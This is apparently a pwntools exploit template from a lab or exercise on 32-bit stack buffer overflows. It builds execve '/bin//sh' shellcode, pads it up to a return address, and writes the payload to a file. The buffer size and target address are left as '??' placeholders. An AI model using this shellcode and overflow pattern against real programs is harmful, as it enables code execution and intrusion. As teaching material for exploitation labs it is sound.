from pwn import *

# Number of bytes required to reach Return Address
BUF_SIZE = ??

# Manually build shellcode for exploit (don't worry about this)
sc = asm("""
xor    eax,eax
push   eax
push   0x68732f2f
push   0x6e69622f
mov    ebx, esp
xor    ecx, ecx
xor    edx, edx
mov    al,0x6
add    al,0x5
int    0x80
""")

log.info(f"Bytes until return address: {BUF_SIZE}")
log.info(f"Length of shellcode: {len(sc)}")

# Address we want to return to
#returnAddress = p32(0xffff????) # GDB Ret (GDB memory may be slightly different)
returnAddress = p32(0xffff????) # Normal Ret

# Putting it all together...
exploit = b''
exploit += sc
exploit += b"A" * (BUF_SIZE - len(sc)) # Fill remaining space with garbage
exploit += returnAddress

# Write exploit to a file as bytes (wb)
with open("input.txt", "wb") as fd:
    fd.write(exploit)
